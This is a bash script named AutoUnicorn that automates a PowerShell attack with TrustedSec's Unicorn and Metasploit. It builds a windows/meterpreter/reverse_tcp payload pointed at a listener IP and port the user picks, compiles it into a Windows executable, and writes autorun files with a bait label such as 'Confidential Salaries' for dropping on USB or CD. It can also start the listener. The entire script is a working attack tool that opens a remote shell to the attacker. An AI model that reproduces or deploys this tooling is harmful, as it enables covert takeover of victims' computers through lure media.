#!/usr/bin/env bash
# AutoUnicorn - Automated PowerShell Attack Creator Using TrustedSec Unicorn
# Jason Soto
# www.jsitech.com
# Twitter = @JsiTech
# Tested on Kali Linux

#####################################################################################

# Developed by Jason Soto
# jason_soto [AT] jsitech [DOT] com
# https://github.com/jsitech

######################################################################################

# Credit to @commonexploits, @trustedsec


# User options
PAYLOAD="windows/meterpreter/reverse_tcp" # The payload to use
MSFCONSOLE=`which msfconsole` # Path to the msfconsole script


f_banner(){
  echo
  echo "
    _         _        _   _       _
   / \  _   _| |_ ___ | | | |_ __ (_) ___ ___  _ __ _ __
  / _ \| | | | __/ _ \| | | | '_ \| |/ __/ _ \| '__|  _  |
 / ___ \ |_| | || (_) | |_| | | | | | (_| (_) | |  | | | |
/_/   \_\__,_|\__\___/ \___/|_| |_|_|\___\___/|_|  |_| |_|

Automated Powershell Attack Creator Using Unicorn By TrustedSec
By Jason Soto "
  echo
  echo

}


# Set Output filename

clear
f_banner
echo ""
echo -e "\e[34m--------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[93m[?]\e[00m  Type the Desired Output FileName"
echo -e "\e[34m--------------------------------------------------------------------------------------------\e[00m"
echo ""
echo -ne "\e[01;32m>\e[00m "
read OUTPUTNAME
echo ""
echo -e "\e[34m--------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[93m[?]\e[00m  Type the Desired Label for the AutoRun Files"
echo -e "\e[34m--------------------------------------------------------------------------------------------\e[00m"
echo ""
echo "Example : Confidential Salaries"
echo ""
echo -ne "\e[01;32m>\e[00m "
read LABEL
echo ""

#Check for gcc compiler

which i586-mingw32msvc-gcc >/dev/null 2>&1

if [ $? -eq 0 ]; then
    echo ""
    COMPILER="i586-mingw32msvc-gcc"
else
    which i686-w64-mingw32-gcc
    if [ $? -eq 0 ]; then
        echo ""
        COMPILER="i686-w64-mingw32-gcc"
    else
    echo ""
    echo -e "\e[01;31m[!]\e[00m Unable to find the required gcc program, install i586-mingw32msvc-gcc or i686-w64-mingw32-gcc (Arch) and try again"
    echo ""
    exit 1
    fi
fi

#Check For Unicorn in Current running Directory

ls unicorn/unicorn.py > /dev/null 2>&1
if [ $? -eq 0 ]; then
    echo ""
else
    echo ""
    echo -e "\e[93m[!]\e[00m  I can't find Unicorn in your Current Working Directory I will try and Clone the Repo now"
    echo ""
    sleep 2
    echo ""
    echo -e "\e[93m[-]\e[00m  Cloning Unicorn Repo...please wait"
    echo ""
    git clone https://github.com/trustedsec/unicorn/
    sleep 2
    ls unicorn/unicorn.py > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo -e "\e[01;32m[+]\e[00m Success,"
        cd ..
        echo ""
    else
        echo -e "\e[93m[!]\e[00m  Unable to Clone Unicorn Repo, Cannot Continue"
        echo ""
        exit
    fi
fi

clear
f_banner
echo -e "\e[34m---------------------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[93m[?]\e[00m What system do you want the Metasploit listener to run on? Enter 1 or 2 and press enter"
echo -e "\e[34m---------------------------------------------------------------------------------------------------------\e[00m"
echo ""
echo " 1. Use my current system and IP address"
echo ""
echo " 2. Use an alternative system, i.e public external address"
echo ""
echo -e "\e[34m--------------------------------------------------------------------------------------------------------\e[00m"
echo ""
echo -ne "\e[93m>\e[00m "
read INTEXT
echo ""
if [ "$INTEXT" = "1" ]; then
    echo ""
    IP=$(ip route get 1 | awk '{print $NF;exit}')
    echo -e "\e[93m[-]\e[00m Local system selected, listener will be launched on \e[01;32m$IP\e[00m using interface \e[01;32m$IPINT\e[00m"
    echo ""
    echo -e "\e[34m-------------------------------------------------------\e[00m"
    echo -e "\e[93m[?]\e[00m What port number do you want to listen on?"
    echo -e "\e[34m-------------------------------------------------------\e[00m"
    echo ""
    echo -ne "\e[93m>\e[00m "
    read PORT
    echo ""
elif [ "$INTEXT" = "2" ]; then
    echo ""
    echo -e "\e[93m[-]\e[00m Alternative system selected"
    echo ""
    echo -e "\e[34m--------------------------------------------------------------------\e[00m"
    echo -e "\e[93m[?]\e[00m What IP address to you want the listener to run on?"
    echo -e "\e[34m--------------------------------------------------------------------\e[00m"
    echo ""
    echo -ne "\e[93m>\e[00m "
    read IP
    echo ""
    echo ""
    echo -e "\e[34m---------------------------------------------------------------------------------------------------------\e[00m"
    echo -e "\e[93m[?]\e[00m What port number do you want to listen on? If on the internet try port 53 if restricted"
    echo -e "\e[34m---------------------------------------------------------------------------------------------------------\e[00m"
    echo ""
    echo -ne "\e[93m>\e[00m "
    read PORT
    echo ""
else
    echo -e "\e[93m[!]\e[00m You didnt select a valid option, try again"
    echo ""
    exit 1
fi
echo ""
echo -e "\e[93m[-]\e[00m Generating payload, please wait..."
echo ""

#Payload creator

python unicorn/unicorn.py "$PAYLOAD" "$IP" "$PORT" > /dev/null 2>&1

echo ""
echo -e "\e[93m[-]\e[00m Compiling Created Payload please wait..."
echo ""

STRING1=$(cat powershell_attack.txt | cut -d ' ' -f2)
STRING2=$(cat powershell_attack.txt | cut -d ' ' -f3)
STRING3=$(cat powershell_attack.txt | cut -d ' ' -f4)
STRING4=$(cat powershell_attack.txt | cut -d ' ' -f5)

sed s/PAYLOAD/$STRING1\ $STRING2\ $STRING3\ $STRING4/g pay.c > payload.c

# gcc compile the exploit

ls icons/icon.res >/dev/null 2>&1
if [ $? -eq 0 ]; then
    $COMPILER -Wall -mwindows icons/icon.res payload.c -o "$OUTPUTNAME"
else
    $COMPILER -Wall -mwindows build.c -o "$OUTPUTNAME"
fi


clear
f_banner
# check if file built correctly
LOCATED=`pwd`
ls "$OUTPUTNAME" >/dev/null 2>&1
if [ $? -eq 0 ]; then
    echo ""
    echo -e "\e[01;32m[+]\e[00m Your payload has been successfully created and is located here: \e[01;32m"$LOCATED"/"$OUTPUTNAME"\e[00m"
else
    echo ""
    echo -e "\e[01;31m[!]\e[00m Something went wrong trying to compile the executable, exiting"
    echo ""
    exit 1
fi


echo ""
echo ""

# create autorun files
mkdir autorun >/dev/null 2>&1
cp "$OUTPUTNAME" autorun/ >/dev/null 2>&1
cp icons/autorun.ico autorun/ >/dev/null 2>&1
echo "[autorun]" > autorun/autorun.inf
echo "open="$OUTPUTNAME"" >> autorun/autorun.inf
echo "icon=autorun.ico" >> autorun/autorun.inf
echo "label=$LABEL" >> autorun/autorun.inf
echo ""


echo ""
echo -e "\e[34m[+]\e[00m I have also created 3 AutoRun files here: \e[01;32m"$LOCATED"/"autorun/"\e[00m - simply copy these files to a CD or USB"

echo ""
sleep 2
echo -e "\e[34m--------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[93m[?]\e[00m Do you want the listener to be loaded automatically? Enter 1 or 2 and press enter"
echo -e "\e[34m--------------------------------------------------------------------------------------------\e[00m"
echo ""
echo " 1. Yes"
echo ""
echo " 2. No"
echo ""
echo -e "\e[34m----------------------------------------------------------------------------------------------\e[00m"
echo ""
echo -ne "\e[93m>\e[00m "
read INTEXT
echo ""
if [ "$INTEXT" = "1" ]; then
    echo -e "\e[93m[-]\e[00m Loading the Metasploit listener on \e[01;32m$IP:$PORT\e[00m, please wait..."
    echo ""
    $MSFCONSOLE -r unicorn.rc
else
    echo ""
    echo -e "\e[93m[-]\e[00m Use unicorn.rc as msfconsole resource on your listener system:"
    echo ""
    echo -e "\e[34m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
    echo ""
    echo "$MSFCONSOLE -r unicorn.rc"
    echo ""
    echo -e "\e[34mm+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
    echo ""
fi
